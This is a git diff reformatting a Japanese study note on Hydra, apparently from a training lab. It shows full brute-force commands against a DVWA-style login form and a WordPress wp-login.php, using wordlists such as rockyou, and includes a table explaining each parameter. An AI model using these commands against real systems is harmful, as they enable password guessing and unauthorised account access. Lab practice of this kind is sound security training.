@@ -1,8 +1,10 @@
 # Hydra
 
-1. 様々なプロトコルに対応したBruteForce Attackツール
-2. ワードリスト　`/usr/share/wordlists/metasploit`
-3. コマンド例
+様々なプロトコルに対応したBruteForce Attackツール
+
+* ワードリスト　`/usr/share/wordlists/metasploit`
+
+## コマンド例
 
 ``` shell
     hydra 192.168.XXX.XXX -s 80 -l gordonb -P /usr/share/wordlists/metasploit/burnett_top1024.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=セッションID;security=low:F=Username and/or password incorrect."
@@ -24,7 +26,8 @@
 | `:H=Cookie: PHPSESSID=セッションID;security=low`         | リクエストのヘッダ(Cookie)                  |
 | `:F=Username and/or password incorrect."`                | ログイン失敗時のメッセージ |
 
+## wordpressへのブルートフォースサンプル
+
 ``` shell
-    #wordpressへのブルートフォース
-     sudo hydra training -s 80 -l admin -P /home/student/rockyou_mini.txt http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
+    sudo hydra XXXXXX -s 80 -l admin -P /home/student/rockyou_mini.txt http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
 ```
